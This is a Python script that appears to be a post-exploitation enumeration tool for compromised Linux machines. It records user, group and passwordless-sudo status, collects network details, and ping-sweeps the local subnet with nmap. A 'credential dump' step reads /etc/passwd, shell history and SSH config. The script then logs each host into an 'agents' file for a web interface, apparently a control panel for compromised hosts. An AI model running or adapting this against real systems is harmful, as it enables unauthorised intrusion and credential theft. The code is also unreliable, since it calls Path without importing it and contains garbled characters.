#!/usr/bin/env python3
import os
import subprocess
import socket
import json
from datetime import datetime

LOG_DIR = "logs/enumeration"
AGENTS_FILE = "webgui/agents.json"
HOSTNAME = socket.gethostname()

def ensure_dirs():
    Path(LOG_DIR).mkdir(parents=True, exist_ok=True)
    Path("webgui").mkdir(exist_ok=True)

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore").strip()
    except Exception as e:
        return f"Error: {e}"

def save_log(name, data):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(LOG_DIR, f"{name}_{timestamp}.log")
    with open(filename, "w") as f:
        f.write(data)

def collect_system_info():
    info = {}
    info["hostname"] = run_cmd("hostname")
    info["os"] = run_cmd("uname -a")
    info["uptime"] = run_cmd("uptime")
    info["user"] = run_cmd("whoami")
    info["groups"] = run_cmd("groups")
    info["sudo_check"] = run_cmd("sudo -n true 2>/dev/null && echo 'Yes' || echo 'No'")
    return info

def collect_network_info():
    info = {}
    info["ifconfig"] = run_cmd("ip a || ifconfig")
    info["routes"] = run_cmd("ip route || netstat -rn")
    info["open_ports"] = run_cmd("ss -tuln || netstat -tuln")
    return info

def internal_discovery():
    result = run_cmd("ip route | grep default | awk '{print $3}'")
    base_ip = ".".join(result.split('.')[:3]) + ".0/24"
    scan = run_cmd(f"nmap -sn {base_ip}")
    return scan

def try_credential_dumps():
    creds = ""
    creds += "\n[~] /etc/passwd:\n" + run_cmd("cat /etc/passwd 2>/dev/null")
    creds += "\n[~] .bash_history:\n" + run_cmd("cat ~/.bash_history 2>/dev/null")
    creds += "\n[~] .ssh config:\n" + run_cmd("cat ~/.ssh/config 2>/dev/null")
    return creds

def update_agents_json(system_info):
    agents = []
    if os.path.exists(AGENTS_FILE):
        try:
            with open(AGENTS_FILE, "r") as f:
                agents = json.load(f)
        except:
            pass
    new_entry = {
        "name": system_info.get("hostname", "unknown"),
        "ip": socket.gethostbyname(socket.gethostname()),
        "os": system_info.get("os", ""),
        "user": system_info.get("user", "")
    }
    agents.append(new_entry)
    with open(AGENTS_FILE, "w") as f:
        json.dump(agents, f, indent=4)

def main():
    ensure_dirs()

    print("[*] Gathering system info...")
    sys_info = collect_system_info()
    save_log("system_info", json.dumps(sys_info, indent=4))

    print("[*] Gathering network info...")
    net_info = collect_network_info()
    save_log("network_info", json.dumps(net_info, indent=4))

    print("[*] Performing internal discovery...")
    disc = internal_discovery()
    save_log("discovery", disc)

    print("[*] Attempting credential dumps...")
    creds = try_credential_dumps()
    save_log("credentials", creds)

    print("[*] Updating agent profile...")
    update_agents_json(sys_info)

    print("[â] Enumeration complete. Logs stored in logs/enumeration/")

if __name__ == "__main__":
    main()
